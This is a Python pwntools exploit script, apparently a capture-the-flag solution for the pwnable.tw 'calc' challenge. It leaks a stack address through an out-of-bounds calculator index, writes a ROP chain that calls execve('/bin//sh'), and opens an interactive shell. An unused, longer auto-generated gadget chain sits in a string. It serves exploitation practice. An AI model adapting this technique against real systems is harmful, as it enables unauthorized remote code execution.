from pwn import *
context(os = 'linux',arch = 'i386', log_level = 'debug')
debug = 1
if debug == 1:
	p = process('./calc')
else:
	p = remote('chall.pwnable.tw',10100)
'''
	p = ''

	p += pack('<I', 0x080701aa) # pop edx ; ret
	p += pack('<I', 0x080ec060) # @ .data
	p += pack('<I', 0x0805c34b) # pop eax ; ret
	p += '/bin'
	p += pack('<I', 0x0809b30d) # mov dword ptr [edx], eax ; ret
	p += pack('<I', 0x080701aa) # pop edx ; ret
	p += pack('<I', 0x080ec064) # @ .data + 4
	p += pack('<I', 0x0805c34b) # pop eax ; ret
	p += '//sh'
	p += pack('<I', 0x0809b30d) # mov dword ptr [edx], eax ; ret
	p += pack('<I', 0x080701aa) # pop edx ; ret
	p += pack('<I', 0x080ec068) # @ .data + 8
	p += pack('<I', 0x080550d0) # xor eax, eax ; ret
	p += pack('<I', 0x0809b30d) # mov dword ptr [edx], eax ; ret
	p += pack('<I', 0x080481d1) # pop ebx ; ret
	p += pack('<I', 0x080ec060) # @ .data
	p += pack('<I', 0x080701d1) # pop ecx ; pop ebx ; ret
	p += pack('<I', 0x080ec068) # @ .data + 8
	p += pack('<I', 0x080ec060) # padding without overwrite ebx
	p += pack('<I', 0x080701aa) # pop edx ; ret
	p += pack('<I', 0x080ec068) # @ .data + 8
	p += pack('<I', 0x080550d0) # xor eax, eax ; ret
	p += pack('<I', 0x0807cb7f) # inc eax ; ret
	p += pack('<I', 0x0807cb7f) # inc eax ; ret
	p += pack('<I', 0x0807cb7f) # inc eax ; ret
	p += pack('<I', 0x0807cb7f) # inc eax ; ret
	p += pack('<I', 0x0807cb7f) # inc eax ; ret
	p += pack('<I', 0x0807cb7f) # inc eax ; ret
	p += pack('<I', 0x0807cb7f) # inc eax ; ret
	p += pack('<I', 0x0807cb7f) # inc eax ; ret
	p += pack('<I', 0x0807cb7f) # inc eax ; ret
	p += pack('<I', 0x0807cb7f) # inc eax ; ret
	p += pack('<I', 0x0807cb7f) # inc eax ; ret
	p += pack('<I', 0x08049a21) # int 0x80
'''
key=[0x0805c34b,11,0x080701d1,0,0,0x08049a21,0x6e69622f,0x0068732f]
p.recv()
p.sendline('+360')
addr_bp=int(p.recv())
addr_re=((addr_bp+0x100000000)&0xFFFFFFF0)-16
addr_str=addr_re+20-0x100000000
addr=361
for i in range(5):
      p.sendline('+'+str(addr+i))
      ans=int(p.recv())
      if key[i]<ans:
             ans=ans-key[i]
             p.sendline('+'+str(addr+i)+'-'+str(ans))
      else:
          ans=key[i]-ans
          p.sendline('+'+str(addr+i)+'+'+str(ans))
      p.recv()
p.sendline('+'+'365'+str(addr_str))
p.recv()
for i in range(5,8):
      p.sendline('+'+str(addr+i))
      ans=int(p.recv())
      if key[i]<ans:
             ans=ans-key[i]
             p.sendline('+'+str(addr+i)+'-'+str(ans))
      else:
          ans=key[i]-ans
          p.sendline('+'+str(addr+i)+'+'+str(ans))
      p.recv()
p.sendline("kotori")
p.interactive()
